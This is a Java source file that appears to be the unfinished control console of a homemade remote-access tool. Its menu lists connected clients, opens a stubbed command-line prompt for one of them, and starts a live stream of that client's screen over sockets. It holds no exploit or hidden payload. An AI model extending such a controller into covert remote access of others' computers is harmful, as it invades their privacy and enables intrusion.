import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.NoSuchElementException;
import java.util.Scanner;
import java.util.StringTokenizer;
import java.util.concurrent.CopyOnWriteArrayList;
//import java.util.concurrent.locks.ReentrantLock;


public class JServer {
//	private final static int PORT = 7575; 
	private static List<ClientInfo> connectedClients = new ArrayList<ClientInfo>();
	public static void main(String args[]) {
//		ReentrantLock lock = new ReentrantLock();
		//starts listening and accepting clients trying to communicate with HQ, aka JServer
//		new Thread(new ClientConnector(PORT,(ArrayList<ClientInfo>)(connectedClients), lock)).start();
		//CopyOnWriteArrayList makes it thread safe!
//		new Thread(new ServerConnectionChecker((ArrayList<ClientInfo>)(connectedClients), lock)).start();
		Scanner sc;
		while(true) {
			try {
//				System.out.println("HOST NAME IS: " + InetAddress.getLocalHost().getHostName());
				sc = new Scanner(System.in);
				System.out.println("\n1. ls: Lists all connected clients");
				System.out.println("2. client: to access a client");
				System.out.println("3. quit: Quits the server");
				System.out.print("\nPlease enter a command: ");

				String command = sc.nextLine();
				if(command.equals("ls")) {
					//list the number of clients
//					lock.lock();
					CopyOnWriteArrayList<ClientInfo> temp = new CopyOnWriteArrayList<ClientInfo>(connectedClients);
					for(ClientInfo client : temp) {
						//may need to print out more information about clients in the future
						System.out.println(client.getClientName());
					}
//					lock.unlock();
					//if I want to communicate with a client, I type client.
				} else if(command.equals("client")) { 
					ClientInfo requestedClient = null; //contains the requested client
					while(true) {
						//there is small bug where you print out list of currently connected clients, then someone connects.
						//somehow need to figure out a way to fix update it. idk later. 
						
						System.out.println("Currently Connected Clients: ");
						CopyOnWriteArrayList<ClientInfo> temp = new CopyOnWriteArrayList<ClientInfo>(connectedClients);
//						lock.lock();
						for(ClientInfo client : temp) {
							//may need to print out more information about clients in the future
							System.out.println(client.getClientName());
						}
//						lock.unlock();
						System.out.println("Enter the name of the client you want to connect to:");
						command = sc.nextLine();
						boolean hasFound = false;
						//now find that client
//						lock.lock();
						temp = new CopyOnWriteArrayList<ClientInfo>(connectedClients);
						for(ClientInfo client : temp) {
							if(client.getClientName().equals(command)) {
								requestedClient = client;
								hasFound = true;
								break;
							}
						}
//						lock.unlock();
						if(!hasFound) {
							System.out.println("Please enter a connected client.");
						} else {
							break;
						}
					}
					//add others later...
					while (true) {
						System.out.println("Please enter the number to the action you want to take:");
						System.out.println("1. Access client's command line");
						System.out.println("2. Access client's computer screen live stream");
						System.out.println("3. main"); // exits to main
//						command = "2";
						try {
							command = sc.nextLine();
						} catch(Exception e) {
							e.printStackTrace();
						}
						if (command.equals("1")) { // access the client's command line, move around files
							System.out.println("\nAvailable commands:");
							System.out.println("ls");
							System.out.println("cd nameOfDirectory");
							System.out.println("cd /: Takes you to the root directory");
							System.out.println("cd ..: Takes you up one directory level");
							System.out.println("exit: exits and goes back to client menu option");
							while (true) {
								System.out.print("\nshell>");
								command = sc.nextLine();
								StringTokenizer tokenized = new StringTokenizer(
										command);
								String first = tokenized.nextToken();
								if (tokenized.countTokens() > 2) { // can't be more than 2 for the moment
									System.out.print("Invalid command. Please enter a valid command.");
								} else if (first.equals("ls")) {
									System.out.println("ls success");
								} else if (first.equals("cd")
										&& tokenized.hasMoreTokens()) {
									String second = tokenized.nextToken();
									if (second.equals("/")) {
										System.out.println("cd / success");
									} else if (second.equals("..")) {
										System.out.println("cd .. success");
									} else {
										System.out.println("cd " + second + " success");
									}
								} else if (first.equals("exit")) {
									break;
								} else { // not a valid command
									System.out.print("Invalid command. Please enter a valid command.");
								}
							}
						} else if(command.equals("2")) { //webcam streaming!
							System.out.println("CLIENT IS: " + requestedClient.getClientName());
							OutputStream pw = requestedClient.getCommandSocket().getOutputStream();
							byte[] temp = {(byte)2};
							pw.write(temp, 0, 1);
							while(true) {
								if(requestedClient.getNumSubSockets() == 2) {
									break;
								}
								System.out.println("hug ME LORDY!");
							}
							//DON'T FORGET TO ADD THE LISTENERS FOR REMOTE CONTROL TOMORROW INSIDE REMOTE DESKTOP CLASS!!!
//							
							//UNCOMMENT BELOW WHEN DOING OTHER TESTING SHIT IN WINDOWS GUI!
//							Thread remoteDesktop = new RemoteDesktop(requestedClient);
//							remoteDesktop.start();
							while(true) {
								System.out.print("Please enter the word quit if you want to quit");
								String nextLine = sc.nextLine();
								if(nextLine.equals("quit")) {
									//QUIT REMOTEDESKTOP THREAD!
//									remoteDesktop.interrupt();
									
									//CLIENT SIDE CLOSES SOCKETS!
									//CLIENT SIDE CLOSES SOCKETS!
									//CLIENT SIDE CLOSES SOCKETS!
									//CLIENT SIDE CLOSES SOCKETS!

									
									//ALSO DON'T FORGET TO REMOVE BOTH FROM THE CONNECTEDCLIENTS ARRAY! SUBSOCKETARRAY!
//									requestedClient.removeFirstSubSocket(); //when close socket, client and remote desktop
									System.out.println("44444444444444444444");
									//auto catch error and end automatically.
//									requestedClient.removeFirstSubSocket();
									System.out.println("66666666666666666666");
									pw.write(temp, 0, 1); //send message that it wants to quit.
//									remoteDesktop.interrupt(); //stops that thread
									System.out.println("QUITTING people BYE!");
									break;
								} 
							}
						} else if (command.equals("3")) {
							break;
						} else {
							System.out.println("Please enter a valid action.");
						}
					}
				} else if(command.equals("quit")) { //quits the server
					sc.close();
					System.out.println("\nServer has quit.");
					System.exit(0); //get out of this while loop
				} else { //unknown command
					System.out.println("\nPlease enter a valid command.");
				}
			} catch(NoSuchElementException e) {
				System.out.println("Program has ended!");
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
}
